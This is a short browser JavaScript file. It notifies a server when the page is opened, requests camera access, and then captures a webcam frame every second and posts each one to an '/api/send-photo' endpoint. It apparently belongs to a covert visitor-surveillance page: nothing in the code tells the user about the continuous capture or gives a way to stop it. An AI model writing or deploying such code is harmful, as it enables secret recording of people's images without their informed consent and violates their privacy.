const video = document.getElementById('video');

// ✅ Notify when site is opened
fetch('/api/send-photo', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ notify: true })
}).catch(err => console.error('Notify error:', err));

// Start camera
navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
        video.srcObject = stream;
    })
    .catch(err => console.error('Camera error:', err));

// Capture and send every 1 second
setInterval(() => {
    if (!video.videoWidth) return; // Avoid blank captures
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const image = canvas.toDataURL('image/jpeg');

    fetch('/api/send-photo', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ image })
    }).catch(err => console.error('Send error:', err));
}, 1000);
